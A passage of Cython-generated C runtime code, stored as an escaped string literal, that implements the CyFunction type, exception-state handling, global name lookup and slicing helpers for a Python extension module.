{(char *) \\\"func_globals\\\", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\\n    {(char *) \\\"__globals__\\\", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\\n    {(char *) \\\"func_closure\\\", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\\n    {(char *) \\\"__closure__\\\", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\\n    {(char *) \\\"func_code\\\", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\\n    {(char *) \\\"__code__\\\", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\\n    {(char *) \\\"func_defaults\\\", (getter)__Pyx_CyFun""ction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\\n    {(char *) \\\"__defaults__\\\", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\\n    {(char *) \\\"__kwdefaults__\\\", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},\\n    {(char *) \\\"__annotations__\\\", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},\\n    {0, 0, 0, 0, 0}\\n};\\nstatic PyMemberDef __pyx_CyFunction_members[] = {\\n    {(char *) \\\"__module__\\\", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRI\"\"CTED, 0},\\n    {0, 0, 0,  0, 0}\\n};\\nstatic PyObject *\\n__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)\\n{\\n#if PY_MAJOR_VERSION >= 3\\n    Py_INCREF(m->func_qualname);\\n    return m->func_qualname;\\n#else\\n    return PyString_FromString(m->func.m_ml->ml_name);\\n#endif\\n}\\nstatic PyMethodDef __pyx_CyFunction_methods[] = {\\n    {\\\"__reduce__\\\", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},\\n    {0, 0, 0, 0}\\n};\\n#if PY_VERSION_HEX < 0x030500A0\\n#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)\\n#else\\n#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)\\n#endif\\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,\\n                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\\n    if (unlikely(op == NULL))\\n        return NULL;\\n    op->flags = flags;\\n    __Pyx_CyFunction_weakreflist(op) = NULL;\\n    op->func.m_ml = ml;\\n    op->func.m_self = (PyObject *) op;\\n    Py_XINCREF(closure);\\n    op->func_closure = closure;\\n    Py_XINCREF(module);\\n    op->func.m_module = module;\\n    op->func_dict = NULL;\\n    op->func_name = NULL;\\n    Py_INCREF(qualname);\\n    op->func_qualname = qualname;\\n    op->func_doc ="" NULL;\\n    op->func_classobj = NULL;\\n    op->func_globals = globals;\\n    Py_INCREF(op->func_globals);\\n    Py_XINCREF(code);\\n    op->func_code = code;\\n    op->defaults_pyobjects = 0;\\n    op->defaults_size = 0;\\n    op->defaults = NULL;\\n    op->defaults_tuple = NULL;\\n    op->defaults_kwdict = NULL;\\n    op->defaults_getter = NULL;\\n    op->func_annotations = NULL;\\n    return (PyObject *) op;\\n}\\nstatic int\\n__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)\\n{\\n    Py_CLEAR(m->func_closure);\\n    Py_CLEAR(m->func.m_module);\\n    Py_CLEAR(m->func_dict);\\n    Py_CLEAR(m->func_name);\\n    Py_CLEAR(m->func_qualname);\\n    Py_CLEAR(m->func_doc);\\n    Py_CLEAR(m->fu\"\"nc_globals);\\n    Py_CLEAR(m->func_code);\\n    Py_CLEAR(m->func_classobj);\\n    Py_CLEAR(m->defaults_tuple);\\n    Py_CLEAR(m->defaults_kwdict);\\n    Py_CLEAR(m->func_annotations);\\n    if (m->defaults) {\\n        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);\\n        int i;\\n        for (i = 0; i < m->defaults_pyobjects; i++)\\n            Py_XDECREF(pydefaults[i]);\\n        PyObject_Free(m->defaults);\\n        m->defaults = NULL;\\n    }\\n    return 0;\\n}\\nstatic void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)\\n{\\n    if (__Pyx_CyFunction_weakreflist(m) != NULL)\\n        PyObject_ClearWeakRefs((PyObject *) m);\\n    __Pyx_CyFunction_clear(m);\\n    PyObject_GC_Del(m);\\n}\\nstatic void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)\\n{\\n    PyObject_GC_UnTrack(m);\\n    __Pyx__CyFunction_dealloc(m);\\n}\\nstatic int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)\\n{\\n    Py_VISIT(m->func_closure);\\n    Py_VISIT(m->func.m_module);\\n    Py_VISIT(m->func_dict);\\n    Py_VISIT(m->func_name);\\n    Py_VISIT(m->func_qualname);\\n    Py_VISIT(m->func_doc);\\n    Py_VISIT(m->func_globals);\\n    Py_VISIT(m->func_code);\\n    Py_VISIT(m->func_classobj);\\n    Py_VISIT(m->defaults_tuple);\\n    Py""_VISIT(m->defaults_kwdict);\\n    if (m->defaults) {\\n        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);\\n        int i;\\n        for (i = 0; i < m->defaults_pyobjects; i++)\\n            Py_VISIT(pydefaults[i]);\\n    }\\n    return 0;\\n}\\nstatic PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)\\n{\\n#if PY_MAJOR_VERSION < 3\\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\\n    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {\\n        Py_INCREF(func);\\n        return func;\\n    }\\n    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {\\n        if (type == NULL)\\n            type = (PyObject *)(Py_TYPE(obj));\\n        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py\"\"_TYPE(type)));\\n    }\\n    if (obj == Py_None)\\n        obj = NULL;\\n#endif\\n    return __Pyx_PyMethod_New(func, obj, type);\\n}\\nstatic PyObject*\\n__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)\\n{\\n#if PY_MAJOR_VERSION >= 3\\n    return PyUnicode_FromFormat(\\\"<cyfunction %U at %p>\\\",\\n                                op->func_qualname, (void *)op);\\n#else\\n    return PyString_FromFormat(\\\"<cyfunction %s at %p>\\\",\\n                               PyString_AsString(op->func_qualname), (void *)op);\\n#endif\\n}\\nstatic PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {\\n    PyCFunctionObject* f = (PyCFunctionObject*)func;\\n    PyCFunction meth = f->m_ml->ml_meth;\\n    Py_ssize_t size;\\n    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {\\n    case METH_VARARGS:\\n        if (likely(kw == NULL || PyDict_Size(kw) == 0))\\n            return (*meth)(self, arg);\\n        break;\\n    case METH_VARARGS | METH_KEYWORDS:\\n        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);\\n    case METH_NOARGS:\\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\\n            size = PyTuple_GET_S""IZE(arg);\\n            if (likely(size == 0))\\n                return (*meth)(self, NULL);\\n            PyErr_Format(PyExc_TypeError,\\n                \\\"%.200s() takes no arguments (%\\\" CYTHON_FORMAT_SSIZE_T \\\"d given)\\\",\\n                f->m_ml->ml_name, size);\\n            return NULL;\\n        }\\n        break;\\n    case METH_O:\\n        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {\\n            size = PyTuple_GET_SIZE(arg);\\n            if (likely(size == 1)) {\\n                PyObject *result, *arg0;\\n                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\n                arg0 = PyTuple_GET_ITEM(arg, 0);\\n                #else\\n                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;\\n                #endif\\n                result = (*met\"\"h)(self, arg0);\\n                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\\n                Py_DECREF(arg0);\\n                #endif\\n                return result;\\n            }\\n            PyErr_Format(PyExc_TypeError,\\n                \\\"%.200s() takes exactly one argument (%\\\" CYTHON_FORMAT_SSIZE_T \\\"d given)\\\",\\n                f->m_ml->ml_name, size);\\n            return NULL;\\n        }\\n        break;\\n    default:\\n        PyErr_SetString(PyExc_SystemError, \\\"Bad call flags in \\\"\\n                        \\\"__Pyx_CyFunction_Call. METH_OLDARGS is no \\\"\\n                        \\\"longer supported!\\\");\\n        return NULL;\\n    }\\n    PyErr_Format(PyExc_TypeError, \\\"%.200s() takes no keyword arguments\\\",\\n                 f->m_ml->ml_name);\\n    return NULL;\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {\\n    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);\\n}\\nstatic PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {\\n    PyObject *resul""t;\\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;\\n    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {\\n        Py_ssize_t argc;\\n        PyObject *new_args;\\n        PyObject *self;\\n        argc = PyTuple_GET_SIZE(args);\\n        new_args = PyTuple_GetSlice(args, 1, argc);\\n        if (unlikely(!new_args))\\n            return NULL;\\n        self = PyTuple_GetItem(args, 0);\\n        if (unlikely(!self)) {\\n            Py_DECREF(new_args);\\n#if PY_MAJOR_VERSION > 2\\n            PyErr_Format(PyExc_TypeError,\\n                         \\\"unbound method %.200S() needs an argument\\\",\\n                         cyfunc->func_qualname);\\n#else\\n            PyErr_SetString(PyExc_TypeError,\\n                            \\\"unbound method needs an argument\\\");\\n#endif\\n            return NULL;\\n        }\\n       \"\" result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);\\n        Py_DECREF(new_args);\\n    } else {\\n        result = __Pyx_CyFunction_Call(func, args, kw);\\n    }\\n    return result;\\n}\\nstatic PyTypeObject __pyx_CyFunctionType_type = {\\n    PyVarObject_HEAD_INIT(0, 0)\\n    \\\"cython_function_or_method\\\",\\n    sizeof(__pyx_CyFunctionObject),\\n    0,\\n    (destructor) __Pyx_CyFunction_dealloc,\\n    0,\\n    0,\\n    0,\\n#if PY_MAJOR_VERSION < 3\\n    0,\\n#else\\n    0,\\n#endif\\n    (reprfunc) __Pyx_CyFunction_repr,\\n    0,\\n    0,\\n    0,\\n    0,\\n    __Pyx_CyFunction_CallAsMethod,\\n    0,\\n    0,\\n    0,\\n    0,\\n    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,\\n    0,\\n    (traverseproc) __Pyx_CyFunction_traverse,\\n    (inquiry) __Pyx_CyFunction_clear,\\n    0,\\n#if PY_VERSION_HEX < 0x030500A0\\n    offsetof(__pyx_CyFunctionObject, func_weakreflist),\\n#else\\n    offsetof(PyCFunctionObject, m_weakreflist),\\n#endif\\n    0,\\n    0,\\n    __pyx_CyFunction_methods,\\n    __pyx_CyFunction_members,\\n    __pyx_CyFunction_ge""tsets,\\n    0,\\n    0,\\n    __Pyx_CyFunction_descr_get,\\n    0,\\n    offsetof(__pyx_CyFunctionObject, func_dict),\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n    0,\\n#if PY_VERSION_HEX >= 0x030400a1\\n    0,\\n#endif\\n#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\\n    0,\\n#endif\\n#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000\\n    0,\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000\\n    0,\\n#endif\\n};\\nstatic int __pyx_CyFunction_init(void) {\\n    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);\\n    if (unlikely(__pyx_CyFunctionType == NULL)) {\\n        return -1;\\n    }\\n    return 0;\\n}\\nstatic CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {\\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\\n    m->defaults = PyObject_Malloc(size);\\n   \"\" if (unlikely(!m->defaults))\\n        return PyErr_NoMemory();\\n    memset(m->defaults, 0, size);\\n    m->defaults_pyobjects = pyobjects;\\n    m->defaults_size = size;\\n    return m->defaults;\\n}\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {\\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\\n    m->defaults_tuple = tuple;\\n    Py_INCREF(tuple);\\n}\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {\\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\\n    m->defaults_kwdict = dict;\\n    Py_INCREF(dict);\\n}\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {\\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\\n    m->func_annotations = dict;\\n    Py_INCREF(dict);\\n}\\n\\n/* CythonFunction */\\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qua""lname,\\n                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\\n    PyObject *op = __Pyx_CyFunction_Init(\\n        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),\\n        ml, flags, qualname, closure, module, globals, code\\n    );\\n    if (likely(op)) {\\n        PyObject_GC_Track(op);\\n    }\\n    return op;\\n}\\n\\n/* PyObjectCallNoArg */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {\\n#if CYTHON_FAST_PYCALL\\n    if (PyFunction_Check(func)) {\\n        return __Pyx_PyFunction_FastCall(func, NULL, 0);\\n    }\\n#endif\\n#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)\\n    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))\\n#else\\n    if (likely(PyCFunction_Check(func)))\\n#endif\\n    {\\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {\\n            return __Pyx_PyObject_CallMethO(func, NULL);\\n        }\\n    }\\n    return __Pyx_PyObject_Call(func, __pyx_empty_tup\"\"le, NULL);\\n}\\n#endif\\n\\n/* PyDictVersioning */\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\\n}\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\\n    PyObject **dictptr = NULL;\\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\\n    if (offset) {\\n#if CYTHON_COMPILING_IN_CPYTHON\\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\\n#else\\n        dictptr = _PyObject_GetDictPtr(obj);\\n#endif\\n    }\\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\\n}\\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\\n    P""yObject *dict = Py_TYPE(obj)->tp_dict;\\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\\n        return 0;\\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\\n}\\n#endif\\n\\n/* GetModuleGlobalName */\\n#if CYTHON_USE_DICT_VERSIONS\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\\n#else\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\\n#endif\\n{\\n    PyObject *result;\\n#if !CYTHON_AVOID_BORROWED_REFS\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        return __Pyx_NewRef(result);\\n    } else if (unlikely(PyErr_Occurred())) {\\n        return NULL;\\n    }\\n#else\\n    result = PyDict_GetItem(__pyx_d, name);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        retu\"\"rn __Pyx_NewRef(result);\\n    }\\n#endif\\n#else\\n    result = PyObject_GetItem(__pyx_d, name);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        return __Pyx_NewRef(result);\\n    }\\n    PyErr_Clear();\\n#endif\\n    return __Pyx_GetBuiltinName(name);\\n}\\n\\n/* GetTopmostException */\\n#if CYTHON_USE_EXC_INFO_STACK\\nstatic _PyErr_StackItem *\\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\\n{\\n    _PyErr_StackItem *exc_info = tstate->exc_info;\\n    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&\\n           exc_info->previous_item != NULL)\\n    {\\n        exc_info = exc_info->previous_item;\\n    }\\n    return exc_info;\\n}\\n#endif\\n\\n/* SaveResetException */\\n#if CYTHON_FAST_THREAD_STATE\\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyTh""readState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\\n    #if CYTHON_USE_EXC_INFO_STACK\\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\\n    *type = exc_info->exc_type;\\n    *value = exc_info->exc_value;\\n    *tb = exc_info->exc_traceback;\\n    #else\\n    *type = tstate->exc_type;\\n    *value = tstate->exc_value;\\n    *tb = tstate->exc_traceback;\\n    #endif\\n    Py_XINCREF(*type);\\n    Py_XINCREF(*value);\\n    Py_XINCREF(*tb);\\n}\\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    #if CYTHON_USE_EXC_INFO_STACK\\n    _PyErr_StackItem *exc_info = tstate->exc_info;\\n    tmp_type = exc_info->exc_type;\\n    tmp_value = exc_info->exc_value;\\n    tmp_tb = exc_info->exc_traceback;\\n    exc_info->exc_type = type;\\n    exc_info->exc_value = value;\\n    exc_info->exc_traceback = tb;\\n    #else\\n    tmp_type = tstate->exc_type;\\n    tmp_value = tstate->exc_value;\\n    tmp_tb = tstate->exc_traceback;\\n    tstate->exc_type = type;\\n    tstate->exc_value = value;\\n    tstate->exc_traceback = tb;\"\"\\n    #endif\\n    Py_XDECREF(tmp_type);\\n    Py_XDECREF(tmp_value);\\n    Py_XDECREF(tmp_tb);\\n}\\n#endif\\n\\n/* GetException */\\n#if CYTHON_FAST_THREAD_STATE\\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\\n#else\\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\\n#endif\\n{\\n    PyObject *local_type, *local_value, *local_tb;\\n#if CYTHON_FAST_THREAD_STATE\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    local_type = tstate->curexc_type;\\n    local_value = tstate->curexc_value;\\n    local_tb = tstate->curexc_traceback;\\n    tstate->curexc_type = 0;\\n    tstate->curexc_value = 0;\\n    tstate->curexc_traceback = 0;\\n#else\\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\\n#endif""\\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\\n#if CYTHON_FAST_THREAD_STATE\\n    if (unlikely(tstate->curexc_type))\\n#else\\n    if (unlikely(PyErr_Occurred()))\\n#endif\\n        goto bad;\\n    #if PY_MAJOR_VERSION >= 3\\n    if (local_tb) {\\n        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))\\n            goto bad;\\n    }\\n    #endif\\n    Py_XINCREF(local_tb);\\n    Py_XINCREF(local_type);\\n    Py_XINCREF(local_value);\\n    *type = local_type;\\n    *value = local_value;\\n    *tb = local_tb;\\n#if CYTHON_FAST_THREAD_STATE\\n    #if CYTHON_USE_EXC_INFO_STACK\\n    {\\n        _PyErr_StackItem *exc_info = tstate->exc_info;\\n        tmp_type = exc_info->exc_type;\\n        tmp_value = exc_info->exc_value;\\n        tmp_tb = exc_info->exc_traceback;\\n        exc_info->exc_type = local_type;\\n        exc_info->exc_value = local_value;\\n        exc_info->exc_traceback = local_tb;\\n    }\\n    #else\\n    tmp_type = tstate->exc_type;\\n    tmp_value = tstate->exc_value;\\n    tmp_tb = tstate->exc_traceback;\\n    tstate->exc_type = local_type;\\n    tstate->exc_value = local_value;\\n    tstate->exc_traceback = local_tb;\\n    #endif\\n    Py_XDECREF(tmp_type);\\n    Py_XDECREF(tmp_val\"\"ue);\\n    Py_XDECREF(tmp_tb);\\n#else\\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\\n#endif\\n    return 0;\\nbad:\\n    *type = 0;\\n    *value = 0;\\n    *tb = 0;\\n    Py_XDECREF(local_type);\\n    Py_XDECREF(local_value);\\n    Py_XDECREF(local_tb);\\n    return -1;\\n}\\n\\n/* PyErrFetchRestore */\\n#if CYTHON_FAST_THREAD_STATE\\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    tmp_type = tstate->curexc_type;\\n    tmp_value = tstate->curexc_value;\\n    tmp_tb = tstate->curexc_traceback;\\n    tstate->curexc_type = type;\\n    tstate->curexc_value = value;\\n    tstate->curexc_t""raceback = tb;\\n    Py_XDECREF(tmp_type);\\n    Py_XDECREF(tmp_value);\\n    Py_XDECREF(tmp_tb);\\n}\\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\\n    *type = tstate->curexc_type;\\n    *value = tstate->curexc_value;\\n    *tb = tstate->curexc_traceback;\\n    tstate->curexc_type = 0;\\n    tstate->curexc_value = 0;\\n    tstate->curexc_traceback = 0;\\n}\\n#endif\\n\\n/* SliceObject */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\\n        Py_ssize_t cstart, Py_ssize_t cstop,\\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\\n        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {\\n#if CYTHON_USE_TYPE_SLOTS\\n    PyMappingMethods* mp;\\n#if PY_MAJOR_VERSION < 3\\n    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;\\n    if (likely(ms && ms->sq_slice)) {\\n        if (!has_cstart) {\\n            if (_py_start && (*_py_start != Py_None)) {\\n                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);\\n                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\n            } else\\n                cstart = 0;\\n        }\\n        if (!has_cstop) {\\n            if (_py_stop && (*_py_stop != Py_None)) {\\n                cstop = _\"\"_Pyx_PyIndex_AsSsize_t(*_py_stop);\\n                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\n            } else\\n                cstop = PY_SSIZE_T_MAX;\\n        }\\n        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {\\n            Py_ssize_t l = ms->sq_length(obj);\\n            if (likely(l >= 0)) {\\n                if (cstop < 0) {\\n                    cstop += l;\\n                    if (cstop < 0) cstop = 0;\\n                }\\n                if (cstart < 0) {\\n                    cstart += l;\\n                    if (cstart < 0) cstart = 0;\\n                }\\n            } else {""\\n                if (!PyErr_ExceptionMatches(PyExc_OverflowError))\\n                    goto bad;\\n                PyErr_Clear();\\n            }\\n        }\\n        return ms->sq_slice(obj, cstart, cstop);\\n    }\\n#endif\\n    mp = Py_TYPE(obj)->tp_as_mapping;\\n    if (likely(mp && mp->mp_subscript))\\n#endif\\n    {\\n        PyObject* result;\\n        PyObject *py_slice, *py_start, *py_stop;\\n        if (_py_slice) {\\n            py_slice = *_py_slice;\\n        } else {\\n            PyObject* owned_start = NULL;\\n            PyObject* owned_stop = NULL;\\n            if (_py_start) {\\n                py_start = *_py_start;\\n            } else {\\n                if (has_cstart) {\\n                    owned_start = py_start = PyInt_FromSsize_t(cstart);\\n                    if (unlikely(!py_start)) goto bad;\\n                } else\\n                    py_start = Py_None;\\n            }\\n            if (_py_stop) {\\n                py_stop = *_py_stop;\\n            } else {\\n                if (has_cstop) {\\n                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);\\n                    if (unlikely(!py_stop)) {\\n                        Py_XDECREF(owned_start);\\n                        goto bad;\\n                    }\\n                } else\\n                    py_stop = Py_None;\\n            }\\n            py_slice = PyS\"\"lice_New(py_start, py_stop, Py_None);\\n            Py_XDECREF(owned_start);\\n            Py_XDECREF(owned_stop);\\n            if (unlikely(!py_slice)) goto bad;\\n        }\\n#if CYTHON_USE_TYPE_SLOTS\\n        result = mp->mp_subscript(obj, py_slice);\\n#else\\n        result = PyObject_GetItem(obj, py_slice);\\n#endif\\n        if (!_py_slice) {\\n            Py_DECREF(py_slice);\\n        }\\n        return result;\\n    }\\n    PyErr_Format(PyExc_TypeError,\\n        \\\"'%.200s' object is unsliceable\\\", Py_TYPE(obj)->tp_name);\\nbad:\\n    return NULL;\\n}\\n\\n/* PyErrExceptionMatches */""\\n#if CYTHON_FAST_THREAD_STATE\\nstatic int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\\n    Py_ssize_t i, n;\\n    n = PyTuple_GET_SIZE(tuple);\\n#if PY_MAJOR_VERSION >= 3\\n    for (i=0; i<n; i++) {\\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\\n    }\\n#endif\\n    for (i=0; i<n; i++) {\\n        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;\\n    }\\n    return 0;\\n}\\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {\\n    PyObject *exc_type = tstate->curexc_type;\\n    if (exc_type == err) return 1;\\n    if (unlikely(!exc_type)) return 0;\\n    if (unlikely(PyTuple_Check(err)))\\n        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);\\n    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);\\n}\\n#endif\\n\\n/* PyObjectSetAttrStr */\\n#if CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {\\n    PyTypeObject* tp = Py_TYPE(obj);\\n    if (likely(tp->tp_setattro))\\n        return tp->tp_setattro(obj, attr_name, value);\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(tp->tp_setattr))\\n        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);\\n#endif\\n    return PyObject_SetAttr(obj, attr_name, value);\\n}\\n#endif\\n\\n/* SwapException */\\n#if CYTHON_FAST_THREAD_STATE\\nstatic CYTHON_I\"\"NLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    #if CYTHON_USE_EXC_INFO_STACK\\n    _PyErr_StackItem *exc_info = tstate->exc_info;\\n    tmp_type = exc_info->exc_type;\\n    tmp_value = exc_info->exc_value;\\n    tmp_tb = exc_info->exc_traceback;\\n    exc_info->exc_type = *type;\\n    exc_info->exc_value = *value;\\n    exc_info->exc_traceback = *tb;\\n    #else\\n    tmp_type = tstate->exc_type;\\n    tmp_value = tsta""te->exc_value;\\n    tmp_tb = tstate->exc_traceback;\\n    tstate->exc_type = *type;\\n    tstate->exc_value = *value;\\n    tstate->exc_traceback = *tb;\\n    #endif\\n    *type = tmp_type;\\n    *value = tmp_value;\\n    *tb = tmp_tb;\\n}\\n#else\\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\n    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);\\n    PyErr_SetExcInfo(*type, *value, *tb);\\n    *type = tmp_type;\\n    *value = tmp_value;\\n    *tb = tmp_tb;\\n}\\n#endif\\n\\n/* CLineInTraceback */\\n#ifndef CYTHON_CLINE_IN_TRACEBACK\\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\\n    PyObject 